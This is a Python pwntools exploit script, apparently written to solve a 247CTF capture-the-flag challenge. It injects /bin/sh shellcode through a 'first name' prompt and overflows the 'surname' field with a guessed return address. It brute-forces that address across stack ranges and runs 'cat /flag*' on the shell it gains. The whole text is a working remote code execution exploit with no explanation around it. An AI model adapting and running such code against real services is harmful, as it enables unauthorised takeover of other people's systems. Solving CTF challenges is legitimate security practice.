#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

HOST = 'f7a5ee299a54c9f1.247ctf.com'
PORT = 50430

shellcode = asm(shellcraft.sh())

# Expand search to cover more address space
# Including different page boundaries
addr_ranges = [
    range(0xffffde00, 0xfffff200, 0x8),
    range(0xffffdd00, 0xffffde00, 0x8),
    range(0xffffdc00, 0xffffdd00, 0x8),
]

total = 0
for addr_range in addr_ranges:
    for addr in addr_range:
        total += 1
        if total % 200 == 0:
            print(f"[*] {total} attempts, addr=0x{addr:08x}", flush=True)
        
        try:
            p = remote(HOST, PORT, level='error')
            p.recvuntil(b"first name?\n", timeout=0.2)
            p.send(shellcode.ljust(50, b'\x90'))
            p.recvuntil(b"surname?\n", timeout=0.2)
            p.send(b'Y' * 23 + p32(addr))
            time.sleep(0.08)
            p.sendline(b'cat /flag* 2>&1')
            
            r = p.recvall(timeout=0.15)
            if b'247CTF{' in r:
                print(f"\n\n[+] FLAG at 0x{addr:08x}!")
                print(r.decode('latin1', errors='ignore'))
                sys.exit(0)
            p.close()
        except:
            pass

print(f"[*] Done, {total} total attempts")
